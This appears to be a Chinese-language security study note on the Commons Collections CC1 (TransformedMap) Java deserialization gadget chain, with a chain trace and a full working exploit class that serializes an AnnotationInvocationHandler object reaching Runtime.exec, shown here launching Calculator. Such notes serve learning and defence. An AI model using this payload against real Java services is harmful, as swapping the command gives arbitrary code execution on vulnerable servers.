---
title: CC1(TransformedMap)
date: 2026-02-01 16:14:44
updated: 2026-02-09 19:45:17
tags:
  - Web
  - java
  - 反序列化
  - CC链
---
| **Gadget Chain** | **CC 版本依赖** | **JDK 版本限制** | **核心入口点 (Source)** | **核心特征/用途** |
| --- | --- | --- | --- | --- |
| **CC1** | 3.1 - 3.2.1 | **JDK < 8u71** | `AnnotationInvocationHandler` | 鼻祖链，利用动态代理。高版本 JDK 修复了入口点。 |

[Java反序列化Commons-Collections篇01-CC1链 | Drunkbaby’s Blog](https://drun1baby.github.io/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/)

[CC重启之从零代码构造TransformedMap CC1](https://godownio.github.io/2024/07/10/cc-chong-qi-zhi-cong-ling-dai-ma-gou-zao-transformedmap-cc1/#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%81%8D%E5%8E%86%E8%83%BD%E4%BD%BF%E7%94%A8setValue-%EF%BC%9F)

```java
/*
    Gadget chain:
       ObjectInputStream.readObject()
          AnnotationInvocationHandler.readObject()
                AbstractInputCheckedMapDecorator.setValue()
                   TransformedMap.checkSetValue()
                      ChainedTransformer.transform()
                         ConstantTransformer.transform()
                         InvokerTransformer.transform()
                            Method.invoke()
                               Class.getDeclaredMethod()
                         InvokerTransformer.transform()
                            Method.invoke()
                               Runtime.getRuntime()
                         InvokerTransformer.transform()
                            Method.invoke()
                               Runtime.exec()

 */
```

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1770138342522-b29116f3-d40f-45ce-9d06-db7e96ee340f.png)

# EXP

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.HashedMap;
import org.apache.commons.collections.map.TransformedMap;
import sun.reflect.annotation.ExceptionProxy;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC1Test {
    public static void main(String[] args) throws Exception {

        //反射调用
       /* Class<?> runtime = Class.forName("java.lang.Runtime");
        Method getruntime = runtime.getDeclaredMethod("getRuntime");
        Object runtimeinstance = getruntime.invoke(null);
        Method exec = runtime.getDeclaredMethod("exec", String.class);
        exec.invoke(runtimeinstance,"open -a Calculator");*/

        //sink:InvokerTransformer
        /*Runtime runtimeinstance = Runtime.getRuntime();
        InvokerTransformer exec = new InvokerTransformer("exec", new Class<?>[]{String.class}, new Object[]{"open -a Calculator"});
        exec.transform(runtimeinstance);*/

        /*//通过MapEntry.setValue调用
        Runtime runtimeinstance = Runtime.getRuntime();
        Map<Object,Object> map = new HashMap<>();
        map.put("key", "value");
        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"});
        Map<Object,Object> transformedmap = TransformedMap.decorate(map, null, exec);

        for(Map.Entry entry:transformedmap.entrySet()) {
            entry.setValue(runtimeinstance);
        }
*/
        //完整
        Map<Object,Object> map = new HashMap<>();
        //map的键要与Annotation的参数名相同，解决memberType != null，
        //map的值参数不能为RetentionPolicy.CLASS、RetentionPolicy.SOURCE、RetentionPolicy.RUNTIME,解决!memberType.isInstance(value)的问题
        map.put("value","");
        //InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"});
        //Map<Object,Object> transformedmap = TransformedMap.decorate(map, null, exec));

        //通过反射调用可序列化(Runtime.class)对象，解决Runtime不能序列化的问题
        /*Method getDeclaredMethod = (Method) new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
        Runtime robj = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getDeclaredMethod);
        new InvokerTransformer("exec",new Class[]{String.class}, new Object[]{"open -a Calculator"}).transform(robj);*/

        //ChainedTransformer类的transform方法可递归执行上面的利用链
        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}), 
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), 
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})};
        //new ChainedTransformer(transformers).transform(null);

        //transformedmap作为setValue的对象
        Map<Object,Object> transformedmap = TransformedMap.decorate(map, null, new ChainedTransformer(transformers));

        //source:AnnotationInvocationHandler
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); 
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Retention.class,transformedmap);

        serialize(o);
        //触发readObject
        unserialize("bin.ser");
    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("bin.ser"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        return ois.readObject();
    }
}

```

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1770096222998-25e784ce-99d4-4abf-b1b2-ced2e42c5f49.png)